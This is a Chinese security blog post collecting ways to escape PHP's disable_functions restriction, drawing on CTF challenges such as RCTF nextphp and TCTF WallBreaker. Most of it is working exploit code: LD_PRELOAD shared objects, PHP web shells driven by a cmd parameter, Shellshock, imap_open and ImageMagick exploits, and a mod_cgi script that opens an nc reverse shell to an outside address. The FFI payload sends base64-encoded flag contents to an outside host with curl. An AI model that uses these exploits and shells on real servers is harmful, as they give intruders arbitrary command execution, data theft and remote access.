---
title: PHP Bypass Disable_functions
tags:
  - PHP
date: 2019-11-06 22:23:51
---

`disable_functions` 是 php.ini 中的一个设置选项，可以用来设置 PHP 环境禁止使用某些函数，通常是网站管理员为了安全起见，用来禁用某些危险的命令执行函数等。

常见的绕过 `disable_functions` 的手法：

1. 寻找未禁用的漏网函数，常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec()，逐一尝试，或许有漏网之鱼.

2. 利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果.

3. mod_cgi 模式，尝试修改 .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制（让特定扩展名的文件直接和php-cgi通信）.

4. 攻击后端组件，寻找存在命令注入的 Web 应用常用的后端组件，如 ImageMagick 的魔图漏洞、 bash 的破壳漏洞等.



## 0x01 BlackList

观察 `disable_functions` 的黑名单下是否有漏网之鱼，从而加以利用。

```php
assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,``
```

eg: pctnl_exec(): `--enable-pcntl`

![](/assets/images/move/2019-11-20-08-39-44.png)

```php
<?php pcntl_exec("/bin/cat", array("/flag"));?>
```


## 0x02 Windows COM

Require:

1. Windows: `C:\Windows\System32\wshom.ocx`（默认存在）

2. PHP.ini: `com.allow_dcom = true` （默认关闭）-> Com_dotnet: extension=php_com_dotnet.dll


```php
<?php
$command = $_GET['cmd'];
$wsh = new COM('WScript.shell'); // new COM Obj
$exec = $wsh->exec("cmd /c".$command); // exec command
$stdout = $exec->StdOut();
$stroutput = $stdout->ReadAll();
echo $stroutput;
```

## 0x03 LD_PRELOAD

`LD_PRELOAD` 是 Linux 中的环境变量，可以设置成一个指定库的路径，动态链接时较其他库有着更高的优先级，允许预加载指定库中的函数和符号覆盖掉后续链接的库中的函数和符号。即可以通过重定向共享库函数来进行运行时修复。这项技术可用于绕过反调试代码，也可以用作用户机 rootkit。

### 劫持 getuid()

**Require:** Linux 中已安装并启用 sendmail 程序。

PHP 的 mail() 函数在执行过程中会默认调用系统程序 /usr/sbin/sendmail，而/usr/sbin/sendmail 会调用 getuid()。如果我们能通过 LD_PRELOAD 的方式来劫持getuid()，再用 mail() 函数来触发 sendmail程序进而执行被劫持的 getuid()，从而执行恶意代码。

\* 当 `error_log`的第二个参数 `message_type` 的值为 1 的时候，会调用 mail 函数的同一个内置函数 sendmail：

```php
error_log ( string $message [, int $message_type = 0 [, string $destination [, string $extra_headers ]]] ) : bool
```

![](/assets/images/move/2019-11-20-09-27-50.png)


```php
PHP mail() -> /usr/sbin/sendmail -> getuid() -> exec()
```

**攻击思路:**

1. 编写一个原型为 uid_t getuid(void); 的 C 函数，内部执行攻击者指定的代码，并编译成共享对象 evil.so；

2. 运行 PHP 函数 putenv()，设定环境变量 LD_PRELOAD 为 evil.so，以便后续启动新进程时优先加载该共享对象；

3. 运行 PHP 的 mail() 函数，mail() 内部启动新进程 /usr/sbin/sendmail，由于上一步 LD_PRELOAD 的作用，sendmail 调用的系统函数 getuid() 被优先级更好的 evil.so 中的同名 getuid() 所劫持；达到不调用 PHP 的各种命令执行函数（system(), exec()...etc）仍可执行系统命令的目的。


**调用过程分析：**

查看 sendmail 可能调用的系统 API 明细；

![](/assets/images/move/2019-11-18-11-02-07.png)

`man 2 getuid` 查看 getuid 函数原型：

![](/assets/images/move/2019-11-18-11-04-19.png)

查看 PHP mail() 是否启动新进程:

```php
<?php mail('a','b','c','d'); ?>
```

![](/assets/images/move/2019-11-18-11-15-59.png)

\* 留意到 `/bin/bash` 启动时同样调用了 `getuid`（那么如果别的环境和上述情况一致，在 mail() 中存在启动 execve 调用了 /bin/sh 程序来间接调用 sendmail 的这种情况，即使目标系统未安装或未开启 sendmail 程序，我仍然可以通过 PHP 的 mail() 函数来触发调用了 /bin/sh 程序的 execve，从而调用 getuid() 达到执行劫持函数的目的。）

![](/assets/images/move/2019-11-18-11-18-23.png)

**攻击利用:**

编写 evil.c，劫持 getuid()，获取 LD_PRELOAD 环境变量并预加载恶意的共享库，再删除环境变量 LD_PRELOAD，最后执行由 EVIL_CMDLINE 环境变量获取的系统命令：

```c++
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int geteuid() {
        const char* cmdline = getenv("EVIL_CMDLINE");
        if (getenv("LD_PRELOAD") == NULL) { return 0; }
        unsetenv("LD_PRELOAD"); //在新进程启动前取消 LD_PRELOAD,防止陷入无限循环
        system(cmdline);
}
```

编译为共享对象（`-fPIC` 作用于编译阶段，告诉编译器产生与位置无关代码(Position-Independent Code)，则产生的代码中，没有绝对地址，全部使用相对地址，故而代码可以被加载器加载到内存的任意位置，都可以正确的执行。这正是共享库所要求的，共享库被加载时，在内存的位置不是固定的。）：

```bash
gcc -shared -fPIC test.c -o test.so
```

Shell.php:

```php
<?php
    echo "<p> <b>Example</b>: http://test.com/exp.php?cmd=pwd&outpath=/tmp/xx&sopath=/var/www/html/exp.so </p>";
    $cmd = $_GET["cmd"]; //待执行的系统命令
    $out_path = $_GET["outpath"]; //保存命令执行输出结果的文件路径,便于在页面上显示
    /*是否有读写权限、web是否可跨目录访问、文件将被覆盖和删除...*/
    $evil_cmdline = $cmd . " > " . $out_path . " 2>&1";
    echo "<p> <b>cmdline</b>: " . $evil_cmdline . "</p>";
    putenv("EVIL_CMDLINE=" . $evil_cmdline);
    $so_path = $_GET["sopath"]; //劫持系统函数的共享对象的绝对路径
    putenv("LD_PRELOAD=" . $so_path);
    mail("", "", "", "");
    echo "<p> <b>output</b>: <br />" . nl2br(file_get_contents($out_path)) . "</p>"; 
    unlink($out_path);
```

**流程:**

```php
putenv() -> LD_PRELOAD(evil.so) -> EVIL_CMDLINE=command -> mail() -> sendmail() -> getuid() -> evil.so -> system() > /tmp/output
```

### 劫持启动进程

**劫持 `getuid()` 的缺陷：**

1. Linux 未安装或启用 sendmail.

2. 由于未将主机名添加进 hosts 中，导致每次运行 sendmail 都要耗时半分钟等待域名解析超时返回，www-data 也无法将主机名加入 hosts.

回到 `LD_PRELOAD` 本身，系统通过它预先加载共享对象，如果能找到一个方式，在加载时就执行代码，而不用考虑劫持某一系统函数，那我就完全可以不依赖 sendmail 了。这种场景与 C++ 的构造函数简直神似！

GCC 有个 C 语言扩展修饰符 `__attribute__((constructor))`，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 `__attribute__((constructor))` 修饰的函数。这一细节非常重要，很多朋友用 LD_PRELOAD 手法突破 disable_functions 无法做到百分百成功，正因为这个原因，不要局限于仅劫持某一函数，而应考虑拦劫启动进程这一行为。

此外，通过 LD_PRELOAD 劫持了启动进程的行为，劫持后又启动了另外的新进程，若不在新进程启动前取消 LD_PRELOAD，则将陷入无限循环，所以必须得删除环境变量 LD_PRELOAD。最直观的做法是调用 `unsetenv("LD_PRELOAD")`，这在大部份 linux 发行套件上的确可行，但在 centos 上却无效，究其原因，centos 自己也 hook 了 unsetenv()，在其内部启动了其他进程，根本来不及删除 LD_PRELOAD 就又被劫持，导致无限循环。所以，需要找一种比 unsetenv() 更直接的删除环境变量的方式。是它，全局变量 `extern char** environ`！实际上，`unsetenv()` 就是对 `environ` 的简单封装实现的环境变量删除功能。

**攻击利用:**

bypass_disablefunc.c:

```c++
#define _GNU_SOURCE

#include <stdlib.h>
#include <stdio.h>
#include <string.h>


extern char** environ;

__attribute__ ((__constructor__)) void preload (void)
{
    // get command line options and arg
    const char* cmdline = getenv("EVIL_CMDLINE");

    // unset environment variable LD_PRELOAD.
    // unsetenv("LD_PRELOAD") no effect on some 
    // distribution (e.g., centos), I need crafty trick.
    int i;
    for (i = 0; environ[i]; ++i) {
            if (strstr(environ[i], "LD_PRELOAD")) {
                    environ[i][0] = '\0';
            }
    }

    // executive command
    system(cmdline);
}
```

编译 C 文件为共享对象文件:

```bash
gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc.so
```

Shell 同劫持 getuid() 的 Shell.php。

## 0x04 PHP 7.4 FFI

`FFI`（Foreign Function Interface），即外部函数接口，允许从用户区调用 C 代码。简单地说，就是一项让你在 PHP 里能够调用 C 代码的技术。

当 PHP 所有的命令执行函数被禁用后，通过 PHP 7.4 的新特性 FFI 可以实现用 PHP 代码调用 C 代码的方式，先声明 C 中的命令执行函数，然后再通过 FFI 变量调用该C 函数即可 Bypass disable_functions。

具体可参考：

Require:

1. `opcache.preload` 启用. (指定将在服务器启动时编译和执行的PHP文件，文件中定义的所有函数和大多数类都将永久加载到 PHP 的函数和类表中，并在将来的任何请求的上下文中永久可用)。

2. `FFI support = enable`。

RCTF 2019 - nextphp 解题思路：

可利用点：

1. Preload 配置已经将 preload.php 预加载到内存中，可直接利用其中的类方法；
2. preload.php 中的 unserialize() 函数会调用 run()，而 run()存在任意函数调用风险；
3. index.php 中 eval 会执行 PHP 代码，会帮助我们执行 preload.php 中的反序列化操作；

攻击思路：

1. 先利用 FFI 特性构造恶意序列化内容，用 PHP 通过 FFI 声明和调用 C 中的 system() 函数；
2. 利用 index.php 中的 eval 来执行反序列化操作；
3. 最后调用 FFI 中声明的 system()函数执行命令；

serialize exp:

```php
<?php
final class A implements Serializable {
    protected $data = [
        'ret' => null,
        'func' => 'FFI::cdef',
        'arg' => 'int system(char *command);'
    ];

    private function run () {
        $this->data['ret'] = $this->data['func']($this->data['arg']);
    }

    public function serialize () {
        return serialize($this->data);
    }

    public function unserialize($payload) {
        $this->data = unserialize($payload);
        $this->run();
    }
}

echo(serialize(new A()));
?>
```

利用 index.php 的 eval 来限制执行反序列化操作，然后触发 run() 函数来调用 FFI::cdef 声明 C 中的 system() 函数，然后通过 FFI 变量调用已声明的 system() 来执行任意命令，因为可能有特殊编码这里就进行 base64 加密传送回来. Payload（URL编码后发送）：

```php
$a=unserialize('C:1:"A":89:{a:3:{s:3:"ret";N;s:4:"func";s:9:"FFI::cdef";s:3:"arg";s:26:"int system(char *command);";\}\}');$a->ret->system('curl xx.ceye.io/?c=`cat /flag|base64`');
```


## 0x05 Bash ShellShock

这种利用方法的前提是目标 OS 存在 Bash破壳（CVE-2014-6271）漏洞，该漏洞的具体介绍可参考: [破壳漏洞（CVE-2014-6271）综合分析：“破壳”漏洞系列分析之一](https://www.freebuf.com/news/48331.html)

**Bash 破壳漏洞成因**：目前的 Bash 使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以 `(){` 开头定义的环境变量在命令 ENV 中解析成函数后，Bash 执行并未退出，而是继续解析并执行 shell 命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。

![](/assets/images/move/2019-11-20-08-11-20.png)

mail.c 中 mail() 函数的第五个参数 extra_cmd:

```c++
if (extra_cmd != NULL) {
	spprintf(&sendmail_cmd, 0,"%s %s", sendmail_path, extra_cmd);
} else {
	sendmail_cmd = sendmail_path;
}
```

当 extra_cmd（用户传入的一些额外参数）存在的时候，调用 spprintf() 将 sendmail_path 和 extra_cmd 组合成真正执行的命令行 sendmail_cmd。 然后将sendmail_cmd 丢给 popen() 执行：

```c++
#ifdef PHP_WIN32
	sendmail = popen_ex(sendmail_cmd,"wb", NULL, NULL TSRMLS_CC);
#else
    /* Since popen() doesn't indicate if theinternal fork() doesn't work
    *(e.g. the shell can't be executed) we explicitly set it to 0 to be
    *sure we don't catch any older errno value. */
    errno = 0;
    sendmail = popen(sendmail_cmd,"w");
#endif
```
如果系统默认 sh 是 bash，popen() 会派生 bash 进程，而我们刚才提到的 CVE-2014-6271 漏洞，直接就导致我们可以利用 mail() 函数执行任意命令，绕过disable_functions 的限制。

同样，我们搜索一下 php 的源码，可以发现，明里调用 popen 派生进程的 php函数还有 imap_mail，如果你仅仅通过禁用 mail 函数来规避这个安全问题，那么 imap_mail 是可以做替代的。当然，php 里还可能有其他地方有调用 popen 或其他能够派生 bash 子进程的函数，通过这些地方，都可以通过破壳漏洞执行命令的。简单的禁用 mail() 函数，在上述情况中是不能抵御 bypass disable_functions 的。

exp:

```php
?php 
# Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) 
# Google Dork: none 
# Date: 10/31/2014 
# Exploit Author: Ryan King (Starfall) 
# Vendor Homepage: http://php.net 
# Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror 
# Version: 5.* (tested on 5.6.2) 
# Tested on: Debian 7 and CentOS 5 and 6 
# CVE: CVE-2014-6271 

function shellshock($cmd) { // Execute a command via CVE-2014-6271 @mail.c:283 
   $tmp = tempnam(".","data"); 
   putenv("PHP_LOL=() { x; }; $cmd >$tmp 2>&1"); 
   // In Safe Mode, the user may only alter environment variableswhose names 
   // begin with the prefixes supplied by this directive. 
   // By default, users will only be able to set environment variablesthat 
   // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, 
   // PHP will let the user modify ANY environment variable! 
   mail("a@127.0.0.1","","","","-bv"); // -bv so we don't actuallysend any mail 
   $output = @file_get_contents($tmp); 
   @unlink($tmp); 
   if($output != "") return $output; 
   else return "No output, or not vuln."; 
} 
echo shellshock($_REQUEST["cmd"]); 
?>
```

## 0x06 imap_open()

Require:

1. 安装 PHP 的 imap 扩展：`apt-get install php-imap`。

2. 在 php.ini 中开启 `imap.enable_insecure_rsh = On`。


**基本原理**：

PHP 的 imap_open 函数中的漏洞可能允许经过身份验证的远程攻击者在目标系统上执行任意命令。该漏洞的存在是因为受影响的软件的 imap_open 函数在将邮箱名称传递给rsh 或 ssh 命令之前不正确地过滤邮箱名称。如果启用了 rsh 和 ssh 功能并且 rsh 命令是 ssh 命令的符号链接，则攻击者可以通过向目标系统发送包含`-oProxyCommand` 参数的恶意 IMAP 服务器名称来利用此漏洞。成功的攻击可能允许攻击者绕过其他禁用的 exec 受影响软件中的功能，攻击者可利用这些功能在目标系统上执行任意 shell 命令。利用此漏洞的功能代码是 Metasploit Framework 的一部分。

imap_open() 函数会调用到 rsh 的程序，而该程序中会调用 execve 系统调用来实现 rsh 的调用，其中的邮件地址参数是由 imap_open() 函数的 mailbox 参数传入，同时，由于 rsh 命令是 ssh 命令的符号链接，所以当我们利用 ssh 的 `-oProxyCommand` 参数来构造恶意 mailbox 参数时就能执行恶意命令。

ProxyCommand指定用于连接服务器的命令：

```bash
$ ssh -oProxyCommand="touch flag" localhost
ssh_exchange_identification: Connection closed by remote host
$ ls | grep flag
flag
```

具体分析可参考：[如何在PHP安装中绕过disable_functions](https://xz.aliyun.com/t/4113).


**imap_open()**:

```php
resource imap_open ( string $mailbox , string $username , string $password [, int $options = 0 [, int $n_retries = 0 [, array $params = NULL ]]] )
```

![](/assets/images/move/2019-11-20-08-22-02.png)

mailbox 参数的值由服务器名和服务器上的 mailbox 文件路径所组成，INBOX 代表的是当前用户的个人邮箱。比如，我们可以通过如下方式来设置 mailbox 参数：

```php
$mbox = imap_open ("{localhost:993/PROTOCOL/FLAG}INBOX", "user_id", "password");
```

在括号内的字符串中，我们可以看到服务器名称（或者IP地址）、端口号以及协议名称。用户可以在协议名后设置标志（第3个参数）。

这里不能直接将 ProxyCommand 命令直接转移到 PHP 脚本来代替 imap_open 服务器地址，因为在解析时它会将 **空格解释为分隔符** 和 **斜杠作为标志**。但是我们可以使用 `\$IFS` 这个shell变量来替换 `空格` 符号或使用 `\t` 替换。还可以在 bash 中使用 Ctrl + V 热键和 Tab 键插入标签。要想绕过斜杠，可以使用 `base64编码` 和相关命令对其进行解码。

exp:

```php
<?php
error_reporting(0);
if (!function_exists('imap_open')) {
        die("no imap_open function!");
}
$server = "x -oProxyCommand=echo\t" . base64_encode($_GET['cmd'] . ">/tmp/cmd_result") . "|base64\t-d|sh}";
//$server = 'x -oProxyCommand=echo$IFS$()' . base64_encode($_GET['cmd'] . ">/tmp/cmd_result") . '|base64$IFS$()-d|sh}';
imap_open('{' . $server . ':143/imap}INBOX', '', ''); // or var_dump("\n\nError: ".imap_last_error());
sleep(5); //imap_open() 执行时进行 DNS 轮询存在延时，等待 imap_open() 执行完毕
echo file_get_contents("/tmp/cmd_result");
?>
```


## 0x07 ImageMagick

ImageMagick 是一个功能强大的开源图形处理软件,可以用来读、写和处理超过90种的图片文件,包括流行的 JPEG、GIF、 PNG、PDF 以及 PhotoCD 等格式。使用它可以对图片进行切割、旋转、组合等多种特效的处理。

ImageMagick 之所以支持那么多的文件格式,是因为他内置了非常多的图像处理库,对于这些图像处理库,ImageMagick 给他起了个名字叫做 `Delegate` (委托),每个 Delegate 对应一种格式的文件,然后通过系统的 system() 命令来调用外部的程序对文件进行处理。

### Command Injection

**[CVE-2016-3714](https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html) ImageMagick 命令执行:**

影响版本：

- ImageMagick 6.5.7-8 2012-08-17
- ImageMagick 6.7.7-10 2014-03-06
- 低版本至6.9.3-9 released 2016-04-30

漏洞简述： 

产生原因是因为字符过滤不严谨所导致的执行代码. 对于文件名传递给后端的命令过滤不足,导致允许多种文件格式转换过程中远程执行代码。

[exp](https://www.exploit-db.com/exploits/39766):

```php
# Exploit Title: PHP Imagick disable_functions Bypass
# Date: 2016-05-04
# Exploit Author: RicterZ (ricter@chaitin.com)
# Vendor Homepage: https://pecl.php.net/package/imagick
# Version: Imagick  <= 3.3.0 PHP >= 5.4
# Test on: Ubuntu 12.04

# Exploit:

<?php
# PHP Imagick disable_functions Bypass
# Author: Ricter <ricter@chaitin.com>
#
# $ curl "127.0.0.1:8080/exploit.php?cmd=cat%20/etc/passwd"
# <pre>
# Disable functions: exec,passthru,shell_exec,system,popen
# Run command: cat /etc/passwd
# ====================
# root:x:0:0:root:/root:/usr/local/bin/fish
# daemon:x:1:1:daemon:/usr/sbin:/bin/sh
# bin:x:2:2:bin:/bin:/bin/sh
# sys:x:3:3:sys:/dev:/bin/sh
# sync:x:4:65534:sync:/bin:/bin/sync
# games:x:5:60:games:/usr/games:/bin/sh
# ...
# </pre>
echo "Disable functions: " . ini_get("disable_functions") . "\n";
$command = isset($_GET['cmd']) ? $_GET['cmd'] : 'id';
echo "Run command: $command\n====================\n";

$data_file = tempnam('/tmp', 'img');
$imagick_file = tempnam('/tmp', 'img');

$exploit = <<<EOF
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/image.jpg"|$command>$data_file")'
pop graphic-context
EOF;

file_put_contents("$imagick_file", $exploit);
$thumb = new Imagick();
$thumb->readImage("$imagick_file");
$thumb->writeImage(tempnam('/tmp', 'img'));
$thumb->clear();
$thumb->destroy();

echo file_get_contents($data_file);
?>
```

### LD_PRELOAD + ghostscript

可参考：[TCTF2019 WallBreaker-Easy 解题分析](https://xz.aliyun.com/t/4688).

当 ImageMagick 处理到以下 11 种格式文件时，会调用 GhostScript 库进行处理:

```php
EPI EPS EPS2 EPS3 EPSF EPSI EPT PS PS2 PS3 PS4 PDF
```

**攻击流程：**

1. 我们应该传入一个 ept 后缀文件和一个编译好的 so 文件;

2. 然后写一个 php 文件通过 putenv 函数修改 LD_PRELOAD 加载该 so;

3. 接着 php 里创建一个 Imagick 对象处理该 ept 文件，此时由于该后缀 imagemagick 会调用 ghostscript 库对该文件进行处理;

4. 而编译好的 so 文件其实作用在于重新编译了 ghostscript 运行过程中要调用的 fflush 方法，我们将想执行的命令写入该方法中就能实现命令执行的效果。


查看是否调用 `GhostScript`:

```bash
convert 1.png ept:1.ept
strace -f php image.php 2>&1 | grep -C2 execve
```

查看 `/usr/bin/gs` 看一下这个程序都有哪些符号：

![](/assets/images/move/2019-11-20-10-02-15.png)

从符号中可以看出他调用的库函数，选择 `fflush` 这个函数来进行劫持：

```c++
#include <string.h>
void payload() {
    const char* cmd = getenv('CMD')
    system(cmd);
}
int fflush() {
    if (getenv("LD_PRELOAD") == NULL) { return 0; }
    unsetenv("LD_PRELOAD");
    payload();
}
```

编译生成共享库对象：

```bash
gcc -shared -fPIC test.c -o hack.so
```

Payload:

```php
putenv('LD_PRELOAD=/tmp/3accb9900a8be5421641fb31e6861f33/hack.so'); 
putenv('CMD=/readflag > /tmp/3accb9900a8be5421641fb31e6861f33/flag.txt');
$img = new Imagick('/tmp/3accb9900a8be5421641fb31e6861f33/1.ept');
```

### LD_PRELOAD + ffpmeg

当 Imagick 处理的文件是如下后缀的时候，就会调用外部程序 ffmpeg 去处理该文件:

```php
wmv mov m4v m2v mp4 mpg mpeg mkv avi 3g2 3gp
```

- [Link](https://hxp.io/blog/53/0CTF-Quals-2019-Wallbreaker-easy-writeup/)

### 覆盖 Path + ghostscript

Linux 中万物皆文件，执行一个命令的实质其实是执行了一个可执行文件，而系统正是通过 `PATH` 环境变量找到命令对应的可执行文件，当输入命令的时候，系统就会去`PATH` 变量记录的路径下面寻找相应的可执行文件。可以通过 `putenv` 覆盖这个变量为我们可以控制的路径，再将恶意文件上传，命名成对应的命令的名字，程序在执行这个命令的时候，就会执行我们的恶意文件。

造一个可执行文件 `gs`:

```c++
#include <stdlib.h>
#include <string.h>
int main() {
    unsetenv("PATH");
    const char* cmd = getenv("CMD");
    system(cmd);
    return 0;
}
```

payload:

```php
putenv('PATH=/tmp/mydir');
putenv('CMD=/readflag > /tmp/mydir/output');
chmod('/tmp/mydir/gs','0777');
$img = new Imagick('/tmp/mydir/1.ept');
```

### MAGICK_CONFIGURE_PATH

我们在 Github 上查看 ImageMagick 的源码，在官方给出的 QuickStart.txt 中可以看到这样的内容：

```php
Configuration Files

      ImageMagick depends on a number of external configuration files which
      include colors.xml, delegates.xml, and others.
      ImageMagick searches for configuration files in the following order, and
      loads them if found:

          $MAGICK_CONFIGURE_PATH
          $MAGICK_HOME/etc/ImageMagick
          $MAGICK_HOME/share/ImageMagick-7.0.2/config
          $HOME/.config/ImageMagick/
          <client path>/etc/ImageMagick/
          <current directory>/
```

ImageMagick 的配置文件位置与环境变量有关，那么结合 `putenv` 我们就可以控制 ImageMagick 的配置。接下来，我们需要做的就是寻找一些可以帮助我们执行命令的配置项。

`delegates.xml` 定义了 ImageMagick 处理各种文件类型的规则，构造 exp 如下：

```xml
<delegatemap>
    <delegate decode="ps:alpha" command="sh -c &quot;/readflag > /tmp/output&quot;"/>
</delegatemap>
```

Payload:

```php
putenv('MAGICK_CONFIGURE_PATH=/tmp/3accb9900a8be5421641fb31e6861f33');
$img = new Imagick('/tmp/3accb9900a8be5421641fb31e6861f33/1.ept');
```

### MAGICK_CODER_MODULE_PATH

> **MAGICK_CODER_MODULE_PATH** can permits the user to arbitrarily extend the image formats supported by ImageMagick by adding loadable coder modules from an preferred location rather than copying them into the ImageMagick installation directory

- [Document](https://www.imagemagick.org/script/resources.php#Environment%20Variables)

- [Link](https://github.com/m0xiaoxi/CTF_Web_docker/tree/master/TCTF2019/Wallbreaker_Easy)

## 0x08 mod_cgi

Require:

1. Apache + mod_cgi Allowed

2. .htaccess Allowed & Writeable

![](/assets/images/move/2019-11-20-10-49-54.png)

> 任何具有mime类型application/x-httpd-cgi或者被 cgi-script处理器(Apache 1.1或以后版本)处理的文件将被作为CGI脚本对待并由服务器运行, 它的输出将被返回给客户端。通过两种途径使文件成为CGI脚本，或者文件具有已由 AddType指令定义的扩展名，或者文件位于 ScriptAlias目录中。

exp（?checked=true）:

```php
<?php
$cmd = "nc -c '/bin/bash' 10.11.12.13 8888"; //command to be executed
$shellfile = "#!/bin/bash\n"; //using a shellscript
$shellfile .= "echo -ne \"Content-Type: text/html\\n\\n\"\n"; //header is needed, otherwise a 500 error is thrown when there is output
$shellfile .= "$cmd"; //executing $cmd
function checkEnabled($text,$condition,$yes,$no) //this surely can be shorter
{
    echo "$text: " . ($condition ? $yes : $no) . "<br>\n";
}
if (!isset($_GET['checked']))
{
    @file_put_contents('.htaccess', "\nSetEnv HTACCESS on", FILE_APPEND); //Append it to a .htaccess file to see whether .htaccess is allowed
    header('Location: ' . $_SERVER['PHP_SELF'] . '?checked=true'); //execute the script again to see if the htaccess test worked
}
else
{
    $modcgi = in_array('mod_cgi', apache_get_modules()); // mod_cgi enabled?
    $writable = is_writable('.'); //current dir writable?
    $htaccess = !empty($_SERVER['HTACCESS']); //htaccess enabled?
        checkEnabled("Mod-Cgi enabled",$modcgi,"Yes","No");
        checkEnabled("Is writable",$writable,"Yes","No");
        checkEnabled("htaccess working",$htaccess,"Yes","No");
    if(!($modcgi && $writable && $htaccess))
    {
        echo "Error. All of the above must be true for the script to work!"; //abort if not
    }
    else
    {
        checkEnabled("Backing up .htaccess",copy(".htaccess",".htaccess.bak"),"Suceeded! Saved in .htaccess.bak","Failed!"); //make a backup, cause you never know.
        checkEnabled("Write .htaccess file",file_put_contents('.htaccess',"Options +ExecCGI\nAddHandler cgi-script .dizzle"),"Succeeded!","Failed!"); //.dizzle is a nice extension
        checkEnabled("Write shell file",file_put_contents('shell.dizzle',$shellfile),"Succeeded!","Failed!"); //write the file
        checkEnabled("Chmod 777",chmod("shell.dizzle",0777),"Succeeded!","Failed!"); //rwx
        echo "Executing the script now. Check your listener <img src = 'shell.dizzle' style = 'display:none;'>"; //call the script
    }
}
?>
```

**- 参看 -**

\[1\] [浅谈几种Bypass disable_functions的方法 - Mi1k7ea](https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-disable-functions%E7%9A%84%E6%96%B9%E6%B3%95/)

\[2\] [从RCTF nextphp看PHP7.4的FFI绕过disable_functions - Mi1k7ea](https://www.mi1k7ea.com/2019/06/07/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9C%8BPHP7-4%E7%9A%84FFI%E7%BB%95%E8%BF%87disable-functions/)

\[3\] [PHP Bypass disabled_functions - Smi1e](https://www.smi1e.top/php-bypass-disabled_functions/)

\[4\] [绕过php的disable_functions - MeetSec](http://47.98.146.200/index.php/archives/47/)

\[5\] [TCTF2019 WallBreaker-Easy 解题分析](https://xz.aliyun.com/t/4688)



